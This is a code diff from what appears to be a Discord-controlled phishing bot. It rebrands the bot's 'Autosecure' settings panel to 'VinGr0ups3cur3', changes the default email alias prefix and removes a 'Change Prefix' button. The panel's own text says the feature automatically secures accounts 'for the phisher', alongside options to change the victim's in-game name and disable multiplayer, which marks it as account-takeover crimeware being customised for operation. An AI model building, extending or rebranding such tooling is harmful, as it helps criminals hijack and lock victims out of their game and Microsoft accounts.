@@ -21,10 +21,10 @@ module.exports = async function autosecureMsg(botnumber, ownerid) {
 
     // Main embed with all the settings
     const embed = new EmbedBuilder()
-        .setTitle(`Autosecure Settings`)
+        .setTitle(`VinGr0ups3cur3 Settings`)
         .setColor(0xb2c7e0)
         .addFields(
-            { name: "Autosecure", value: `${settings.auto_secure ? "✅" : "❌"}`, inline: true },
+            { name: "VinGr0ups3cur3", value: `${settings.auto_secure ? "✅" : "❌"}`, inline: true },
             { name: "Change IGN", value: `${settings.change_ign ? "✅" : "❌"}`, inline: true },
             { name: "Disable Multiplayer", value: `${settings.multiplayer ? "✅" : "❌"}`, inline: true },
             { name: "Secure non-mc", value: `${settings.secureifnomc ? "✅" : "❌"}`, inline: true },
@@ -49,7 +49,7 @@ module.exports = async function autosecureMsg(botnumber, ownerid) {
         .setMinValues(1)
         .addOptions([
             {
-                label: `${settings.auto_secure ? 'Stop' : 'Start'} Autosecure`,
+                label: `${settings.auto_secure ? 'Stop' : 'Start'} VinGr0ups3cur3`,
                 description: 'Automatically secure accounts for the phisher',
                 value: `settings|auto_secure|${settings.auto_secure ? '0' : '1'}`,
             },
@@ -165,7 +165,7 @@ module.exports = async function autosecureMsg(botnumber, ownerid) {
             { name: "Custom PFP", value: settings.pfp && settings.pfp !== (config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png") && settings.pfp !== "https://static.wikia.nocookie.net/leagueoflegends/images/e/e2/Warding_Totem_item.png/revision/latest/smart/width/250/height/250?cb=20201109132946" ? "Custom" : "Default", inline: true },
             { name: "Change Language", value: settings.changelanguage ? "✅" : "❌", inline: true },
             { name: "Custom Language", value: settings.language ? `${settings.language}` : "Default: en-US", inline: true },
-            { name: "Email/Alias Prefix", value: settings.prefix ? settings.prefix : "HachiiroMC", inline: true }
+            { name: "Email/Alias Prefix", value: config.prefix || "vinGr0up", inline: true }
         );
 
     // Create action rows
@@ -197,10 +197,6 @@ module.exports = async function autosecureMsg(botnumber, ownerid) {
         new ButtonBuilder()
             .setCustomId(`changedomainautosecure|${botnumber}|${ownerid}`)
             .setLabel(`Change Domain`)
-            .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
-            .setCustomId(`changeprefixautosecure|${botnumber}|${ownerid}`)
-            .setLabel(`Change Prefix`)
             .setStyle(ButtonStyle.Primary)
     );
 
